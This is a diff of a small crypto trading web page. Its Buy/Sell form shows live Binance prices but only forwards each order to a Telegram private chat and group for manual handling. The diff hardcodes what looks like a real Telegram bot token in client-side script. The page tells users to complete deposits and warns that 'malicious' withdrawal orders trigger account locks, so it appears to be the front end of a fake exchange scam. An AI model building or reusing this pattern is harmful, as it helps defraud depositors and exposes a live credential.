@@ -26,7 +26,11 @@
       box-sizing:border-box;
     }
 
-    select option { color:black; }
+    /* ▼ 下拉选择背景白色、文字黑色 */
+    select option {
+      background: white !important;
+      color: black !important;
+    }
 
     .trade-btn { 
         width:100%; 
@@ -75,18 +79,18 @@
   <h2></h2>
 
   <div class="transaction-type">
-    <button class="btn buy-btn" onclick="setType('buy')">Buy</button>
-    <button class="btn sell-btn" onclick="setType('sell')">Sell</button>
+    <button class="btn buy-btn" id="buyBtn">Buy</button>
+    <button class="btn sell-btn" id="sellBtn">Sell</button>
   </div>
 
   <label>Select Coin:</label>
-  <select id="currency" onchange="updateConverted()"></select>
+  <select id="currency"></select>
 
   <label>Amount:</label>
-  <input type="number" id="amount" placeholder="Enter amount" oninput="updateConverted()">
+  <input type="number" id="amount" placeholder="Enter amount">
 
   <label>Amount Currency:</label>
-  <select id="amountCurrency" onchange="updateConverted()"></select>
+  <select id="amountCurrency"></select>
 
   <div class="adjusted-box" id="convertedBox">
     <p><b>Auto-conversion:</b></p>
@@ -94,33 +98,71 @@
 
   <div class="stop-box">
     <label>
-      <input type="checkbox" id="slCheckbox" onclick="toggleSL()"> 
+      <input type="checkbox" id="slCheckbox"> 
       Enable Stop-loss/Take-profit
     </label>
 
     <div id="slBox" style="display:none; margin-top:6px;">
-        <input type="number" id="takeProfit" placeholder="TP %" oninput="updateTPSL()">
-        <input type="number" id="stopLoss" placeholder="SL %" oninput="updateTPSL()">
+        <input type="number" id="takeProfit" placeholder="TP %">
+        <input type="number" id="stopLoss" placeholder="SL %">
 
         <div id="tpResult" style="color:#7ed957; margin-top:6px;"></div>
         <div id="slResult" style="color:#ff8c69;"></div>
     </div>
   </div>
 
-  <button class="trade-btn" onclick="sendTrade()">Trade</button>
+  <button class="trade-btn" id="tradeBtn">Trade</button>
 
   <p class="hint-cn">🤖 Please ensure you have completed your deposit. Failure to deposit or submitting a withdrawal order maliciously may trigger your account security protection mechanism and prevent you from submitting further orders.</p>
 
 </div>
 
 <script>
-// WebSocket 实时币价同步
-let livePrice = {};  // 保存实时价格
+const BOT_TOKEN = "8423870040:AAEyKQukt720qD7qHZ9YrIS9m_x-E65coPU";
+const PRIVATE_ID = 6062973135;
+const GROUP_ID = -1003262870745;
+
+let tradeType = "buy";
+let livePrice = {};
+
+const coins = ["BTC","ETH","BNB","SOL","XRP","ADA","DOGE","TRX","DOT","MATIC","AVAX","USDT","USDC","DAI"];
+
+document.addEventListener("DOMContentLoaded", () => {
+    initUI();
+    initWebSocket();
+});
+
+function initUI() {
+    const c1 = document.getElementById("currency");
+    const c2 = document.getElementById("amountCurrency");
+
+    coins.forEach(c => {
+        c1.innerHTML += `<option value="${c}">${c}</option>`;
+        c2.innerHTML += `<option value="${c}">${c}</option>`;
+    });
+
+    c2.value = "USDT";
+
+    document.getElementById("buyBtn").onclick = () => setType("buy");
+    document.getElementById("sellBtn").onclick = () => setType("sell");
+    document.getElementById("tradeBtn").onclick = sendTrade;
+
+    document.getElementById("slCheckbox").onclick = toggleSL;
+
+    document.getElementById("amount").oninput = updateConverted;
+    c1.onchange = updateConverted;
+    c2.onchange = updateConverted;
+
+    document.getElementById("takeProfit").oninput = updateTPSL;
+    document.getElementById("stopLoss").oninput = updateTPSL;
+
+    setType("buy");
+}
 
 function initWebSocket() {
     const socket = new WebSocket("wss://stream.binance.com:9443/ws/!ticker@arr");
 
-    socket.onmessage = (ev) => {
+    socket.onmessage = ev => {
         const data = JSON.parse(ev.data);
         data.forEach(t => {
             if (t.s.endsWith("USDT")) {
@@ -134,63 +176,13 @@ function initWebSocket() {
     socket.onclose = () => setTimeout(initWebSocket, 2000);
 }
 
-initWebSocket();
-
-// Telegram Bot 配置
-const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; // 替换为你的 Telegram Token
-const PRIVATE_ID = 6062973135;
-const GROUP_ID = -1003262870745;
-
-function sendToTelegram(msg) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-    const payload = (chatId) => ({
-        method:"POST",
-        headers:{ "Content-Type":"application/json" },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: msg,
-            parse_mode: "Markdown",
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text:"✅ 成功交易", callback_data:"trade_success" },
-                        { text:"❌ 取消交易", callback_data:"trade_cancel" }
-                    ]
-                ]
-            }
-        })
-    });
-
-    fetch(url, payload(GROUP_ID));
-    fetch(url, payload(PRIVATE_ID));
-}
-
-// 交易币种列表
-const coins = ["BTC","ETH","BNB","SOL","XRP","ADA","DOGE","TRX","DOT","MATIC","AVAX","USDT","USDC","DAI"];
-
-window.onload = () => {
-    const c1 = document.getElementById("currency");
-    const c2 = document.getElementById("amountCurrency");
-
-    coins.forEach(c => {
-        c1.innerHTML += `<option value="${c}">${c}</option>`;
-        c2.innerHTML += `<option value="${c}">${c}</option>`;
-    });
-
-    c2.value = "USDT";
-};
-
-// 交易类型
-let tradeType = "buy";
-
 function setType(t){
     tradeType = t;
-    document.querySelector(".buy-btn").style.filter = t === "buy" ? "brightness(100%)" : "brightness(60%)";
-    document.querySelector(".sell-btn").style.filter = t === "sell" ? "brightness(100%)" : "brightness(60%)";
+
+    document.getElementById("buyBtn").style.filter = t === "buy" ? "brightness(100%)" : "brightness(40%)";
+    document.getElementById("sellBtn").style.filter = t === "sell" ? "brightness(100%)" : "brightness(40%)";
 }
 
-// 自动转换计算
 function updateConverted() {
     const amount = Number(document.getElementById("amount").value);
     const from = document.getElementById("amountCurrency").value;
@@ -198,6 +190,7 @@ function updateConverted() {
     const box = document.getElementById("convertedBox");
 
     box.innerHTML = "<p><b>Auto-conversion:</b></p>";
+
     if (!amount || !livePrice[from] || !livePrice[to]) return;
 
     const usd = amount * livePrice[from]; 
@@ -206,7 +199,11 @@ function updateConverted() {
     box.innerHTML += `<p>${to}: ${v.toFixed(6)}</p>`;
 }
 
-// TP / SL 计算
+function toggleSL() {
+    document.getElementById("slBox").style.display =
+        document.getElementById("slCheckbox").checked ? "block" : "none";
+}
+
 function updateTPSL() {
     if (!document.getElementById("slCheckbox").checked) return;
 
@@ -219,25 +216,15 @@ function updateTPSL() {
 
     if (tp) {
         document.getElementById("tpResult").innerHTML =
-            `TP 价格: ${(price * (1 + tp/100)).toFixed(6)} USDT`;
-    } else {
-        document.getElementById("tpResult").innerHTML = "";
-    }
+            `TP Price: ${(price * (1 + tp/100)).toFixed(6)} USDT`;
+    } else document.getElementById("tpResult").innerHTML = "";
 
     if (sl) {
         document.getElementById("slResult").innerHTML =
-            `SL 价格: ${(price * (1 - sl/100)).toFixed(6)} USDT`;
-    } else {
-        document.getElementById("slResult").innerHTML = "";
-    }
+            `SL Price: ${(price * (1 - sl/100)).toFixed(6)} USDT`;
+    } else document.getElementById("slResult").innerHTML = "";
 }
 
-function toggleSL() {
-    document.getElementById("slBox").style.display =
-        document.getElementById("slCheckbox").checked ? "block" : "none";
-}
-
-// 生成订单号
 function generateOrderId() {
     const d = new Date();
     const y = d.getFullYear();
@@ -247,7 +234,23 @@ function generateOrderId() {
     return `TRD-${y}${m}${day}-${rand}`;
 }
 
-// 提交交易
+function sendToTelegram(msg) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    const payload = chatId => ({
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: msg,
+            parse_mode: "Markdown"
+        })
+    });
+
+    fetch(url, payload(PRIVATE_ID));
+    fetch(url, payload(GROUP_ID));
+}
+
 function sendTrade(){
     const c = document.getElementById("currency").value;
     const amount = document.getElementById("amount").value;
@@ -258,7 +261,6 @@ function sendTrade(){
     if (!amount) { alert("Enter amount"); return; }
 
     const orderId = generateOrderId();
-    const now = new Date().toLocaleString();
 
     const msg =
 `📌 *New Trade Request*
@@ -266,9 +268,12 @@ function sendTrade(){
 
 Type: *${tradeType}*
 Amount: *${amount} ${ac}*
-Target: *${tp}* Stop-loss: *${sl}*`;
+Take-profit: *${tp}*
+Stop-loss: *${sl}*`;
 
     sendToTelegram(msg);
+
+    alert("Trade submitted!");
 }
 </script>
 
